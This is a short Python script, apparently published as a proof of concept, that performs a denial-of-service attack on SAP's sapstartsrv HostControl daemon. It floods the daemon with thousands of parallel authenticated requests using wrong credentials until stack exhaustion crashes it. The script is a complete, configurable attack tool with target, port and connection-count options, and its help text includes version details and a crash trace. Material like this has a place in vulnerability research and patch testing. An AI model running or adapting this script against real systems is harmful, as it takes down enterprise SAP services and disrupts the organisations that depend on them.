#!/usr/bin/env python
#
# DOS on sapstartsrv daemon
# using grequest (requests + async support)
# -- gelim


import argparse
import grequests
import platform
#from threading import Thread
#import requests

help_desc='''
SAP HostControl stack exhaustion DOS.

Process sapstartsrv will handle  a lot of authenticated requests with wrong user,
it will fork a lot of sapuxuserchk process, stack exhaustion will occur with a
SIGSEV signal sent to sapstartsrv.

Tested on all SAP Netweaver stack (7.0-7.5) + HANA SPS12.
5000 parallel connections are sufficient to trigger the crash.

[Thr 140737243707136] Thu Oct 13 13:48:14 2016
[Thr 140737243707136] Caught signal SIGSEGV
[Thr 140737243707136] ------------------ C-STACK ----------------------
(CTrcStack2+0x82)[0x8c7802]
(_Z18trc_signal_handleri+0xa2)[0x486a22]
[Thr 140737243707136] -------------------------------------------------
'''

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=help_desc,
                                     formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('--host', default='127.0.0.1', help='SAP Hostcontrol server')
    parser.add_argument('-p', '--port', default=1128, type=int, help='SAP Hostcontrol port (default: 1128)')
    parser.add_argument('-c', '--count', default=5000, type=int, help='Number of parallel connections (default: 5000')
    args = parser.parse_args()

    # important detail, you need to expand a bit the number of open file per thread
    if platform.system() in ['Linux', 'Darwin']:
        import resource
        resource.setrlimit(resource.RLIMIT_NOFILE, (args.count, args.count))
        maxfd = args.count
    else:
        print "Plarform unsupported, you'll probably have an max open fd limitation"
        print "Just run this script 2/3 times to circumvent the problem."
        maxfd = 1024

    url="http://%s:%d/slp/processes" % (args.host, args.port) # accessing a path that require auth (forking sapuxuserchk)
    req = [grequests.get(url, auth=('user_KqPa@sLX9S', 'password_z0PQSd2X'))]
    reqs = req*maxfd
    grequests.map(reqs)